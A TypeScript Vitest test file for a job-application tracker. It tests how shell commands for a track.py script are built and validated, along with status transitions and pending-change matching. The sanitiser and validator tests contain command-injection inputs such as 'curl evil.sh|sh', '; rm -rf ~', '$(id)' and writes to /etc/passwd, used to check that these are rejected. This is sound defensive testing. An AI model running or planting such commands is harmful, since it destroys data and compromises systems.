import { describe, it, expect } from "vitest";
import { formatPendingCommand, isValidTrackCommand } from "../src/lib/ingestSchema";
import { isAllowedTransition } from "../src/lib/transitions";
import { matchesPendingChange } from "../src/lib/autoApply";

// ── formatPendingCommand ───────────────────────────────────────────────────────

describe("formatPendingCommand", () => {
  const TODAY = "2026-07-27";

  describe("kind: status", () => {
    it("produces exact command string", () => {
      expect(formatPendingCommand("status", 2, "applied", TODAY)).toBe(
        `python3.11 scripts/track.py set 2 applied --date ${TODAY}`,
      );
    });

    it("Stripe evaluated→applied gate check", () => {
      expect(formatPendingCommand("status", 2, "applied", "2026-07-27")).toBe(
        "python3.11 scripts/track.py set 2 applied --date 2026-07-27",
      );
    });
  });

  describe("kind: note", () => {
    it("wraps note in double quotes", () => {
      const cmd = formatPendingCommand("note", 1, "simple note", TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py set 1 --note "simple note" --date ${TODAY}`,
      );
    });

    it("replaces embedded double-quotes with single quotes (B1: no escaping)", () => {
      const cmd = formatPendingCommand("note", 1, 'she said "hello"', TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py set 1 --note "she said 'hello'" --date ${TODAY}`,
      );
    });

    it("replaces dollar signs (B1: $ stays shell-active when escaped)", () => {
      const cmd = formatPendingCommand("note", 1, "costs $50", TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py set 1 --note "costs S50" --date ${TODAY}`,
      );
    });

    it("neutralizes backticks, backslashes and semicolons (review B1)", () => {
      const cmd = formatPendingCommand(
        "note",
        3,
        "run `curl evil.sh|sh`; also C:\\path",
        TODAY,
      );
      expect(cmd).not.toMatch(/[`\\;|]/);
      expect(cmd).toContain("'curl evil.sh/sh'");
    });

    it("defangs --force and --yes inside notes", () => {
      const cmd = formatPendingCommand("note", 3, "use --force or --yes", TODAY);
      expect(cmd).not.toContain("--force");
      expect(cmd).not.toContain("--yes");
    });

    it("strips newlines, replacing with space", () => {
      const cmd = formatPendingCommand("note", 1, "line1\nline2", TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py set 1 --note "line1 line2" --date ${TODAY}`,
      );
    });
  });

  describe("kind: contact", () => {
    it("produces exact command string", () => {
      const cmd = formatPendingCommand("contact", 5, "jane@stripe.com", TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py contact 5 --contact "jane@stripe.com"`,
      );
    });

    it("replaces special chars in contact (B1)", () => {
      const cmd = formatPendingCommand("contact", 5, 'name "nick"', TODAY);
      expect(cmd).toBe(
        `python3.11 scripts/track.py contact 5 --contact "name 'nick'"`,
      );
    });
  });

  describe("kind: followup_done", () => {
    it("produces exact command string", () => {
      const cmd = formatPendingCommand(
        "followup_done",
        4,
        "sent follow-up email",
        TODAY,
      );
      expect(cmd).toBe(
        `python3.11 scripts/track.py followup 4 --note "sent follow-up email"`,
      );
    });

    it("replaces dollar sign in followup note (B1)", () => {
      const cmd = formatPendingCommand(
        "followup_done",
        4,
        "asked about $equity",
        TODAY,
      );
      expect(cmd).toBe(
        `python3.11 scripts/track.py followup 4 --note "asked about Sequity"`,
      );
    });
  });
});

// ── isValidTrackCommand (review B2) ───────────────────────────────────────────

describe("isValidTrackCommand", () => {
  it("accepts a clean track.py command", () => {
    expect(isValidTrackCommand(
      'python3.11 scripts/track.py set 2 rejected --date 2026-07-27',
    )).toBe(true);
  });

  it("accepts shlex-quoted notes with single quotes", () => {
    expect(isValidTrackCommand(
      "python3.11 scripts/track.py set 2 rejected --note 'no longer moving forward'",
    )).toBe(true);
  });

  it("rejects non-track.py commands", () => {
    expect(isValidTrackCommand("rm -rf ~")).toBe(false);
    expect(isValidTrackCommand("python3 scripts/track.py set 2 applied")).toBe(false);
  });

  it("rejects shell-active characters", () => {
    for (const cmd of [
      "python3.11 scripts/track.py set 2 applied; rm -rf ~",
      "python3.11 scripts/track.py set 2 `whoami`",
      "python3.11 scripts/track.py set 2 $(id)",
      "python3.11 scripts/track.py set 2 a | sh",
      "python3.11 scripts/track.py set 2 a > /etc/passwd",
      "python3.11 scripts/track.py set 2 a\nrm -rf ~",
    ]) {
      expect(isValidTrackCommand(cmd)).toBe(false);
    }
  });

  it("rejects banned flags and oversized commands", () => {
    expect(isValidTrackCommand(
      "python3.11 scripts/track.py set 2 evaluated --force",
    )).toBe(false);
    expect(isValidTrackCommand(
      "python3.11 scripts/track.py " + "a".repeat(500),
    )).toBe(false);
  });

  it("every formatPendingCommand output passes validation", () => {
    const samples = [
      formatPendingCommand("status", 2, "applied", "2026-07-27"),
      formatPendingCommand("note", 1, 'evil `cmd` "quote" $HOME \\ ; | & !', "2026-07-27"),
      formatPendingCommand("contact", 5, "Jane Doe <jane@x.com>", "2026-07-27"),
      formatPendingCommand("followup_done", 4, "done", "2026-07-27"),
    ];
    for (const cmd of samples) expect(isValidTrackCommand(cmd)).toBe(true);
  });
});

// ── isAllowedTransition ────────────────────────────────────────────────────────

describe("isAllowedTransition", () => {
  // ── Allowed: forward pipeline ──────────────────────────────────────────────
  it("evaluated → applied: allowed", () =>
    expect(isAllowedTransition("evaluated", "applied")).toBe(true));
  it("applied → oa: allowed", () =>
    expect(isAllowedTransition("applied", "oa")).toBe(true));
  it("oa → responded: allowed", () =>
    expect(isAllowedTransition("oa", "responded")).toBe(true));
  it("responded → interview: allowed", () =>
    expect(isAllowedTransition("responded", "interview")).toBe(true));
  it("interview → offer: allowed", () =>
    expect(isAllowedTransition("interview", "offer")).toBe(true));
  it("offer → hired: allowed", () =>
    expect(isAllowedTransition("offer", "hired")).toBe(true));
  // skipping steps forward is also allowed
  it("evaluated → interview: allowed (skip steps)", () =>
    expect(isAllowedTransition("evaluated", "interview")).toBe(true));
  it("applied → offer: allowed (skip steps)", () =>
    expect(isAllowedTransition("applied", "offer")).toBe(true));

  // ── Allowed: exit transitions ──────────────────────────────────────────────
  it("applied → rejected: allowed", () =>
    expect(isAllowedTransition("applied", "rejected")).toBe(true));
  it("applied → discarded: allowed", () =>
    expect(isAllowedTransition("applied", "discarded")).toBe(true));
  it("applied → withdrawn: allowed", () =>
    expect(isAllowedTransition("applied", "withdrawn")).toBe(true));
  it("interview → rejected: allowed", () =>
    expect(isAllowedTransition("interview", "rejected")).toBe(true));
  it("evaluated → withdrawn: allowed", () =>
    expect(isAllowedTransition("evaluated", "withdrawn")).toBe(true));

  // ── Forbidden: backward pipeline ──────────────────────────────────────────
  it("applied → evaluated: forbidden (backward)", () =>
    expect(isAllowedTransition("applied", "evaluated")).toBe(false));
  it("interview → applied: forbidden (backward)", () =>
    expect(isAllowedTransition("interview", "applied")).toBe(false));
  it("offer → oa: forbidden (backward)", () =>
    expect(isAllowedTransition("offer", "oa")).toBe(false));

  // ── Forbidden: terminal → anything ────────────────────────────────────────
  it("hired → applied: forbidden (terminal)", () =>
    expect(isAllowedTransition("hired", "applied")).toBe(false));
  it("rejected → interview: forbidden (terminal)", () =>
    expect(isAllowedTransition("rejected", "interview")).toBe(false));
  it("discarded → applied: forbidden (terminal)", () =>
    expect(isAllowedTransition("discarded", "applied")).toBe(false));
  it("withdrawn → evaluated: forbidden (terminal)", () =>
    expect(isAllowedTransition("withdrawn", "evaluated")).toBe(false));

  // ── Forbidden: same status ─────────────────────────────────────────────────
  it("applied → applied: forbidden (same)", () =>
    expect(isAllowedTransition("applied", "applied")).toBe(false));
  it("interview → interview: forbidden (same)", () =>
    expect(isAllowedTransition("interview", "interview")).toBe(false));
});

// ── matchesPendingChange ───────────────────────────────────────────────────────

describe("matchesPendingChange", () => {
  const BASE_APP = { status: "applied", contact: "alice@example.com", notes: "" };
  const CREATED_AT = new Date("2026-01-15T10:00:00Z");

  // ── status kind ───────────────────────────────────────────────────────────
  it("status: matches when app.status === target_status", () => {
    expect(
      matchesPendingChange(
        { kind: "status", payload: { target_status: "applied" }, createdAt: CREATED_AT },
        { ...BASE_APP, status: "applied" },
        [],
      ),
    ).toBe(true);
  });

  it("status: no match when app.status differs", () => {
    expect(
      matchesPendingChange(
        { kind: "status", payload: { target_status: "interview" }, createdAt: CREATED_AT },
        { ...BASE_APP, status: "applied" },
        [],
      ),
    ).toBe(false);
  });

  it("status: no match when app is null (not in ingest payload)", () => {
    expect(
      matchesPendingChange(
        { kind: "status", payload: { target_status: "applied" }, createdAt: CREATED_AT },
        null,
        [],
      ),
    ).toBe(false);
  });

  // ── contact kind ──────────────────────────────────────────────────────────
  it("contact: matches when contact === target_contact", () => {
    expect(
      matchesPendingChange(
        { kind: "contact", payload: { target_contact: "alice@example.com" }, createdAt: CREATED_AT },
        BASE_APP,
        [],
      ),
    ).toBe(true);
  });

  it("contact: no match when contact differs", () => {
    expect(
      matchesPendingChange(
        { kind: "contact", payload: { target_contact: "bob@example.com" }, createdAt: CREATED_AT },
        BASE_APP,
        [],
      ),
    ).toBe(false);
  });

  // ── note kind ─────────────────────────────────────────────────────────────
  it("note: matches when notes CONTAINS the note text", () => {
    expect(
      matchesPendingChange(
        { kind: "note", payload: { note: "follow up sent" }, createdAt: CREATED_AT },
        { ...BASE_APP, notes: "2026-01-16: follow up sent via email" },
        [],
      ),
    ).toBe(true);
  });

  it("note: no match when notes do not contain the note text", () => {
    expect(
      matchesPendingChange(
        { kind: "note", payload: { note: "rejected offer" }, createdAt: CREATED_AT },
        { ...BASE_APP, notes: "waiting for response" },
        [],
      ),
    ).toBe(false);
  });

  it("note: no match when note payload is empty string", () => {
    expect(
      matchesPendingChange(
        { kind: "note", payload: { note: "" }, createdAt: CREATED_AT },
        { ...BASE_APP, notes: "anything" },
        [],
      ),
    ).toBe(false);
  });

  // ── followup_done kind ────────────────────────────────────────────────────
  it("followup_done: matches when a followup event exists on/after createdAt date", () => {
    expect(
      matchesPendingChange(
        { kind: "followup_done", payload: { reason: "done" }, createdAt: CREATED_AT },
        BASE_APP,
        [{ source: "followup", date: "2026-01-16" }],
      ),
    ).toBe(true);
  });

  it("followup_done: matches when event date equals createdAt date", () => {
    const createdAt = new Date("2026-01-15T00:00:00Z");
    expect(
      matchesPendingChange(
        { kind: "followup_done", payload: {}, createdAt },
        BASE_APP,
        [{ source: "followup", date: "2026-01-15" }],
      ),
    ).toBe(true);
  });

  it("followup_done: no match when event is before createdAt date", () => {
    expect(
      matchesPendingChange(
        { kind: "followup_done", payload: {}, createdAt: CREATED_AT },
        BASE_APP,
        [{ source: "followup", date: "2026-01-14" }],
      ),
    ).toBe(false);
  });

  it("followup_done: no match when event source is not followup", () => {
    expect(
      matchesPendingChange(
        { kind: "followup_done", payload: {}, createdAt: CREATED_AT },
        BASE_APP,
        [{ source: "jarvis", date: "2026-01-20" }],
      ),
    ).toBe(false);
  });

  it("followup_done: no match when no events", () => {
    expect(
      matchesPendingChange(
        { kind: "followup_done", payload: {}, createdAt: CREATED_AT },
        BASE_APP,
        [],
      ),
    ).toBe(false);
  });
});
